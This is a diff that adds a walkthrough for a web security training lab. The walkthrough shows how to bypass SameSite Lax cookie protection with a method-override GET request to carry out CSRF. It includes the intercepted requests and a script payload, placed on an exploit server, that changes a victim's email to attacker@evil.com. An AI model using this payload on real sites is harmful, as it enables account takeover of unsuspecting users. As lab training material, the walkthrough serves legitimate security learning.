@@ -1,0 +1,28 @@
+Log in to the application using valid credentials.
+Change the email address once and intercept the request in Burp Suite.
+Observe the following request:
+POST /my-account/change-email HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOURSESSION
+
+email=test@web-security-academy.net
+Notice that:
+No CSRF token is present.
+The application relies only on the session cookie.
+Session cookies are set without a SameSite attribute, so browsers apply the default SameSite=Lax policy.
+Send the request to Burp Repeater.
+Right-click the request and select Change request method to convert it into a GET request.
+Observe that the server rejects normal GET requests.
+Add the _method=POST parameter to override the request method:
+GET /my-account/change-email?email=pwned@web-security-academy.net&_method=POST HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Send the request and observe that the email address changes successfully.
+Create the following exploit on the exploit server:
+<script>
+document.location="https://0a0000db038544b080aa03e400ed0081.web-security-academy.net/my-account/change-email?email=attacker@evil.com&_method=POST";
+</script>
+Store the exploit and click View exploit to test it.
+Confirm that the email address changes automatically.
+Modify the email address so it does not match your own account email.
+Click Deliver to victim.
+The victim’s email address changes successfully, confirming a CSRF vulnerability caused by bypassing SameSite cookie restrictions using top-level navigation and method override.
